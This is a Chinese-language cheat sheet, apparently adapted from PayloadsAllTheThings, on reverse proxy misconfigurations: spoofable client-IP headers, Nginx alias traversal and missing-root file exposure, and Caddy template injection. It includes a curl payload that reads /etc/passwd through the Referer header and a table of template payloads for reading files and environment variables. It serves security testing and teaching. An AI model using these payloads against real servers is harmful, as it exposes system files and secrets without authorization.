# Reverse Proxy Misconfigurations - 反向代理配置错误

[SEARCH_KEYWORDS]
漏洞类型: Reverse Proxy Misconfigurations 反向代理配置错误 Nginx Caddy Apache
攻击类型: Access Bypass SSRF Directory Traversal Internal Resource Exposure
关键词: reverse proxy nginx caddy apache proxy_pass location alias
技术: Off By Slash Missing Root X-Forwarded-For Template Injection
头部: X-Forwarded-For X-Real-IP True-Client-IP

[CONTENT]

## 反向代理配置错误概述

反向代理是位于客户端和后端服务器之间的服务器，转发客户端请求到适当服务器。配置错误可能导致未授权访问、目录遍历或内部资源暴露。

## HTTP头部

### X-Forwarded-For

用于识别通过代理连接的客户端原始IP地址：

```ps1
X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
```

Nginx可覆盖为真实IP：

```ps1
proxy_set_header X-Forwarded-For $remote_addr;
```

### X-Real-IP

Nginx常用，只包含单个IP：

```ps1
X-Real-IP: 192.168.1.1
```

### True-Client-IP

Akamai开发的头部标准。

## Nginx配置错误

### Off By Slash

斜杠的存在与否改变匹配逻辑：

```ps1
location /app/ {
  # 匹配 /app/ 及其下所有内容
}
location /app {
  # 匹配 /app, /application, /appzzz
}
```

**漏洞配置**：

```ps1
location /styles {
  alias /path/css/;
}
```

攻击：`/styles../secret.txt` 解析为 `/path/styles/../secret.txt`

### Missing Root Location

```ps1
server {
  root /etc/nginx;

  location /hello.txt {
    try_files $uri $uri/ =404;
    proxy_pass http://127.0.0.1:8080/;
  }
}
```

请求 `/nginx.conf` 解析为 `/etc/nginx/nginx.conf`。

## Caddy模板注入

漏洞配置：

```ps1
:80 {
    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
```

**利用**：

```ps1
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

### Caddy Payload

| Payload | 描述 |
|---------|------|
| `{{env "VAR_NAME"}}` | 获取环境变量 |
| `{{listFiles "/"}}` | 列出目录文件 |
| `{{readFile "path"}}` | 读取文件 |

## 工具

- gixy - Nginx配置静态分析器
- Kyubi - 发现Nginx别名遍历配置错误
- bypass-url-parser - URL绕过测试工具

```ps1
bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
```

## 参考文档

原始来源: PayloadsAllTheThings/Reverse Proxy Misconfigurations/README.md